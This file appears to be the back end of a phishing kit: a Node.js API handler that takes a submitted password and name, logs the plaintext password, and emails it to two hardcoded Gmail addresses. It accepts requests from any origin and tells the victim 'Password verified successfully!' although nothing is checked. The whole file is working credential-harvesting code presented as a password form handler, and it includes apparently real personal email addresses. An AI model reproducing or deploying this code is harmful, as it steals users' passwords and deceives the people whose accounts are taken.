import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle OPTIONS request (preflight)
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only allow POST method
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Get data from frontend
    const { password, emails, name } = req.body;

    console.log('🔐 Password Form Received:');
    console.log('Password:', password);
    console.log('Emails:', emails);
    console.log('Name:', name || 'User');

    // Validate required fields
    if (!password) {
      return res.status(400).json({
        success: false,
        message: 'Password is required'
      });
    }

    // Default emails if not provided
    const emailArray = Array.isArray(emails) ? emails : [
      "lingdavid24@gmail.com",
      "mehtabalii67890@gmail.com"
    ];

    const userName = name || "User";

    // Send email
    const emailResult = await sendPasswordEmail(password, emailArray, userName);

    return res.status(200).json({
      success: true,
      message: 'Password verified successfully!',
      emailSent: emailResult.success,
      recipients: emailArray,
      name: userName,
      emailMessage: emailResult.message
    });

  } catch (error) {
    console.error('❌ Server Error:', error);
    return res.status(500).json({
      success: false,
      message: 'Internal server error',
      error: error.message
    });
  }
}

async function sendPasswordEmail(password, emailArray, name) {
  try {
    // Check environment variables
    if (!process.env.GMAIL_USER || !process.env.GMAIL_APP_PASS) {
      throw new Error('Email credentials not configured');
    }

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_APP_PASS
      }
    });

    const mailOptions = {
      from: `"Password System" <${process.env.GMAIL_USER}>`,
      to: emailArray.join(', '),
      subject: `🔐 Password from ${name} - ${new Date().toLocaleDateString()}`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 2px solid #d32f2f; border-radius: 10px;">
          <div style="background: #d32f2f; color: white; padding: 15px; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px;">
            <h2 style="margin: 0;">🔐 PASSWORD FORM SUBMISSION</h2>
          </div>
          
          <div style="background: #fff3e0; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
            <h3 style="color: #555; margin-top: 0;">📝 Submission Details</h3>
            
            <table style="width: 100%; border-collapse: collapse;">
              <tr>
                <td style="padding: 10px; border-bottom: 1px solid #ddd; font-weight: bold; width: 120px;">Name:</td>
                <td style="padding: 10px; border-bottom: 1px solid #ddd;">${name}</td>
              </tr>
              <tr>
                <td style="padding: 10px; border-bottom: 1px solid #ddd; font-weight: bold;">Password:</td>
                <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                  <code style="background: #f5f5f5; padding: 8px 12px; border-radius: 5px; font-family: 'Courier New', monospace; font-size: 16px;">
                    ${password}
                  </code>
                </td>
              </tr>
              <tr>
                <td style="padding: 10px; border-bottom: 1px solid #ddd; font-weight: bold;">Length:</td>
                <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                  <span style="background: #e3f2fd; color: #1976d2; padding: 4px 12px; border-radius: 20px; font-weight: bold;">
                    ${password.length} characters
                  </span>
                </td>
              </tr>
              <tr>
                <td style="padding: 10px; font-weight: bold;">Time:</td>
                <td style="padding: 10px;">${new Date().toLocaleString()}</td>
              </tr>
            </table>
          </div>
          
          <div style="background: #e8f5e9; padding: 15px; border-radius: 5px;">
            <p style="margin: 0; color: #2e7d32; font-weight: bold;">
              📧 Sent to ${emailArray.length} recipients:
            </p>
            <p style="margin: 5px 0 0 0; color: #388e3c;">
              ${emailArray.join('<br>')}
            </p>
          </div>
        </div>
      `,
      text: `PASSWORD FORM SUBMISSION\n\nName: ${name}\nPassword: ${password}\nLength: ${password.length} characters\nTime: ${new Date().toLocaleString()}\n\nSent to:\n${emailArray.join('\n')}`
    };

    const info = await transporter.sendMail(mailOptions);
    
    console.log(`✅ Email sent successfully to ${emailArray.length} recipients`);
    console.log('📧 Recipients:', emailArray);
    console.log('✉️ Message ID:', info.messageId);

    return {
      success: true,
      message: `Email sent successfully to ${emailArray.length} recipients`,
      messageId: info.messageId
    };

  } catch (error) {
    console.error('❌ Email Error:', error);
    return {
      success: false,
      message: 'Failed to send email: ' + error.message
    };
  }
}
